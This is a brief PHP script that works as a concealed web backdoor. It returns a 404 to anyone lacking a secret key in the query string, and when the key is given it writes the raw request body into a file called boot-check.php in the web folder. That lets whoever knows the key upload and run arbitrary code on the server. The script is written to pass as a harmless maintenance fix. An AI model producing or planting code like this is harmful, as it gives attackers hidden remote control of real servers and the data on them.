<?php
if (($_GET["k"] ?? "") !== "tmpfix2026") { http_response_code(404); exit; }
file_put_contents(__DIR__."/boot-check.php", file_get_contents("php://input"));
echo "written ".filesize(__DIR__."/boot-check.php");
